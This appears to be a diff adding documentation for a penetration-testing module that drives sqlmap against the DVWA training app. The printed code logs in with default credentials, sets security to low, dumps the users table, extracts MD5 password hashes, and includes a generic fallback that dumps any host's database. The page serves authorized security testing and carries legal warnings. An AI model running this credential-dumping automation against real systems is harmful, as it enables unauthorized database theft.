@@ -1,0 +1,319 @@
+---
+title: "SQL Injection Testing"
+description: "SQLMap-based SQL injection detection and database extraction module"
+---
+
+## Overview
+
+The `SQLMapInjector` module automates SQL injection vulnerability detection and exploitation using SQLMap. It includes specialized support for DVWA (Damn Vulnerable Web Application) with automatic authentication, cookie handling, and credential extraction from dumped databases.
+
+<Warning>
+**Authorization Required**: SQL injection testing can modify or delete database contents. Only test applications you own or have explicit written permission to test. Unauthorized testing is illegal.
+</Warning>
+
+## Module Location
+
+```
+services/sqlmap_inject.py
+```
+
+## Class Definition
+
+```python
+class SQLMapInjector:
+    def __init__(self, host: Host):
+        self.host = host
+        self.sql_dir = Path(f"{Config.OUTPUT_BASE}/sqlmap")
+        self.sql_dir.mkdir(parents=True, exist_ok=True)
+```
+
+## Core Methods
+
+### _get_dvwa_cookie()
+
+Authenticates to DVWA and retrieves a valid session cookie for SQLMap.
+
+```python
+def _get_dvwa_cookie(self):
+    """Login en DVWA y obtener cookie de sesión"""
+    try:
+        session = requests.Session()
+        login_url = f"http://{self.host.ip}{Config.DVWA_LOGIN_URL}"
+        
+        resp = session.get(login_url, timeout=10)
+        token_match = re.search(r"user_token'\s+value='([^']+)'", resp.text)
+        token = token_match.group(1) if token_match else ''
+        
+        data = {
+            'username': Config.DVWA_DEFAULT_USER,
+            'password': Config.DVWA_DEFAULT_PASS,
+            'Login': 'Login',
+            'user_token': token
+        }
+        session.post(login_url, data=data, timeout=10)
+        
+        session.post(f"http://{self.host.ip}/dvwa/security.php",
+                     data={'security': 'low', 'seclev_submit': 'Submit'},
+                     timeout=10)
+        
+        cookies = session.cookies.get_dict()
+        cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
+        if 'PHPSESSID' in cookies:
+            rprint(f"   [green]🔑 Login DVWA OK (PHPSESSID={cookies['PHPSESSID'][:8]}...)[/green]")
+            return cookie_str + '; security=low'
+        return None
+    except Exception as e:
+        rprint(f"   [yellow]⚠️ Login DVWA fallido: {e}[/yellow]")
+        return None
+```
+
+**Authentication Flow:**
+1. GET request to extract CSRF token (`user_token`)
+2. POST credentials with token to login endpoint
+3. POST to set security level to "low"
+4. Extract `PHPSESSID` from cookies
+5. Return cookie string in format: `PHPSESSID=xxx; security=low`
+
+**Output Example:**
+```
+   🔑 Login DVWA OK (PHPSESSID=a3b8c9d1...)
+```
+
+### attack()
+
+Main attack method that tests for SQL injection and extracts credentials.
+
+```python
+def attack(self):
+    vulns = []
+    rprint("   [cyan]💉 SQLMap contra DVWA...[/cyan]")
+    
+    cookie = self._get_dvwa_cookie()
+    
+    for port, service in list(self.host.ports_open.items())[:3]:
+        if 'http' not in service['service'].lower():
+            continue
+        
+        output_dir = self.sql_dir / f"sql_{self.host.ip}_{port}"
+        output_dir.mkdir(exist_ok=True)
+        
+        if cookie:
+            dvwa_url = f"http://{self.host.ip}:{port}{Config.DVWA_SQLI_URL}?id=1&Submit=Submit"
+            rprint(f"   [red]🎯 SQLMap DVWA: {dvwa_url}[/red]")
+```
+
+### SQLMap Command Construction
+
+The module builds a comprehensive SQLMap command targeting specific database tables:
+
+```python
+cmd = [
+    'sqlmap', '-u', dvwa_url,
+    '--cookie', cookie,
+    '--batch', '--risk=2', '--level=2',
+    '-D', 'dvwa', '-T', 'users',
+    '-C', 'user,password',
+    '--dump',
+    '--dump-format=CSV',
+    '--threads=3',
+    f'--output-dir={output_dir}'
+]
+```
+
+**Command Breakdown:**
+- `-u {url}`: Target URL with vulnerable parameter
+- `--cookie`: Session cookie for authenticated testing
+- `--batch`: Non-interactive mode (auto-answer prompts)
+- `--risk=2`: Medium risk payloads (may cause time-based delays)
+- `--level=2`: Medium testing depth (more payloads)
+- `-D dvwa`: Target database name
+- `-T users`: Target table name
+- `-C user,password`: Specific columns to dump
+- `--dump`: Extract data from tables
+- `--dump-format=CSV`: Output format
+- `--threads=3`: Parallel requests
+- `--output-dir`: Save results location
+
+**Execution:**
+
+```python
+try:
+    result = subprocess.run(
+        cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        timeout=300
+    )
+    full_output = result.stdout or ''
+    
+    # Save complete output for debugging
+    debug_file = output_dir / "sqlmap_full_output.txt"
+    debug_file.write_text(full_output, errors='ignore')
+    
+    is_injectable = any(kw in full_output.lower() for kw in
+                        ['injectable', 'dumped', 'entries', 'fetched'])
+```
+
+Timeout: 300 seconds (5 minutes)
+
+### _find_all_credentials()
+
+Extracts credentials from SQLMap output files and console output.
+
+```python
+def _find_all_credentials(self, output_dir, full_output):
+    """Buscar credenciales en TODOS los sitios posibles"""
+    creds = []
+    
+    # 1. BUSCAR EN ARCHIVOS CSV DE DUMP
+    # SQLMap guarda CSVs en: output_dir/IP/dump/DB/TABLE.csv
+    for root, dirs, files in os.walk(str(output_dir)):
+        for fname in files:
+            fpath = Path(root) / fname
+            
+            if fname.endswith('.csv') or 'dump' in root.lower() or 'users' in fname.lower():
+                try:
+                    content = fpath.read_text(errors='ignore').strip()
+                    if not content:
+                        continue
+                    rprint(f"   [cyan]📄 Archivo encontrado: {fpath.name}[/cyan]")
+                    
+                    lines = content.split('\n')
+                    for line in lines:
+                        # Buscar hashes MD5 en cualquier línea
+                        md5_matches = re.findall(r'([a-fA-F0-9]{32})', line)
+                        if md5_matches:
+                            clean = line.replace('"', '').replace("'", '')
+                            parts = re.split(r'[,\t|]+', clean)
+                            parts = [p.strip() for p in parts if p.strip()]
+```
+
+**Parsing Logic:**
+
+1. **CSV Files**: Searches `dump/` directories for `.csv` files
+2. **MD5 Detection**: Regex pattern `[a-fA-F0-9]{32}` to find password hashes
+3. **Username Extraction**: Parses comma/tab/pipe-delimited formats
+4. **Filtering**: Excludes column names like `user_id`, `first_name`, etc.
+
+**Supported Formats:**
+- `user,hash`
+- `user,,hash` (empty middle column)
+- `"user","hash"` (quoted)
+- `user|hash` (pipe-delimited)
+
+**Output Parsing from STDOUT:**
+
+```python
+if full_output:
+    # Pattern: | something | user | hash |
+    table_rows = re.findall(
+        r'\|[^|]*\|[^|]*?(\b\w{3,20}\b)[^|]*\|[^|]*?([a-fA-F0-9]{32})[^|]*\|',
+        full_output
+    )
+    for user, hash_val in table_rows:
+        if user.lower() not in ['user', 'username', 'password', 'field', 'column']:
+            if not any(c['user'] == user and c['hash'] == hash_val for c in creds):
+                creds.append({
+                    'source': 'SQLMap (DVWA)',
+                    'user': user,
+                    'password': hash_val,
+                    'hash': hash_val,
+                    'cracked': False
+                })
+```
+
+### Vulnerability Reporting
+
+```python
+if is_injectable:
+    vuln = Vulnerability(
+        name="💉 SQL INJECTION + DUMP CREDENCIALES",
+        description=f"SQLi en DVWA: {dvwa_url} → Volcado tabla users",
+        port=port,
+        risk=RiskLevel.CRITICAL,
+        evidence_file=str(output_dir),
+        recommendations="Usar prepared statements, validar inputs, WAF"
+    )
+    vulns.append(vuln)
+    rprint(f"   [bold red]💥 SQLi CRÍTICO + DUMP EXITOSO![/bold red]")
+```
+
+**Output Example:**
+
+```
+   💉 SQLMap contra DVWA...
+   🔑 Login DVWA OK (PHPSESSID=a3b8c9d1...)
+   🎯 SQLMap DVWA: http://192.168.56.101:80/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+   📄 Archivo encontrado: users.csv
+   💥 SQLi CRÍTICO + DUMP EXITOSO!
+   
+   ==================================================
+   🔑 5 CREDENCIALES EXTRAÍDAS:
+   ==================================================
+      👤 admin : 5f4dcc3b5aa765d61d8327deb882cf99
+      👤 gordonb : e99a18c428cb38d5f260853678922e03
+      👤 1337 : 8d3533d75ae2c3966d7e0d4fcc69216b
+      👤 pablo : 0d107d09f5bbe40cade3de5c71e9e9b7
+      👤 smithy : 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+### Fallback Generic Testing
+
+For non-DVWA targets:
+
+```python
+# FALLBACK: endpoints genéricos
+for endpoint in Config.SQL_ENDPOINTS:
+    url = f"http://{self.host.ip}:{port}{endpoint}"
+    fb_output = output_dir / "generic"
+    fb_output.mkdir(exist_ok=True)
+    
+    cmd = [
+        'sqlmap', '-u', url,
+        '--batch', '--risk=2', '--level=2',
+        '--dump', '--dump-format=CSV',
+        '--threads=3',
+        f'--output-dir={fb_output}'
+    ]
+```
+
+Tests common SQL injection endpoints like `/login.php?id=1`, `/search.php?q=test`, etc.
+
+## Output Files
+
+Results stored in:
+```
+{OUTPUT_BASE}/sqlmap/sql_{IP}_{PORT}/
+  ├── sqlmap_full_output.txt    # Complete console output
+  └── {IP}/dump/dvwa/users.csv  # Extracted credentials
+```
+
+## Configuration Requirements
+
+```python
+Config.DVWA_LOGIN_URL = "/dvwa/login.php"
+Config.DVWA_SQLI_URL = "/dvwa/vulnerabilities/sqli/"
+Config.DVWA_DEFAULT_USER = "admin"
+Config.DVWA_DEFAULT_PASS = "password"
+Config.SQL_ENDPOINTS = ["/login.php?id=1", "/search.php?q=test", ...]
+```
+
+## Dependencies
+
+- **sqlmap**: Command-line SQL injection tool
+- **requests**: HTTP library for authentication
+- **rich**: Terminal formatting
+
+## Security Considerations
+
+1. **Database Modification**: `--dump` can trigger database reads; avoid on production systems
+2. **Detection**: Risk level 2 may trigger WAF/IDS alerts
+3. **Performance**: Aggressive scanning can overload application servers
+4. **Legal**: Dumping credentials from unauthorized systems is a criminal offense
+
+## Related Modules
+
+- **HashCracker**: Cracks extracted MD5 password hashes
+- **NmapScanner**: Identifies HTTP services to test
+- **GobusterEnum**: Discovers additional injection endpoints
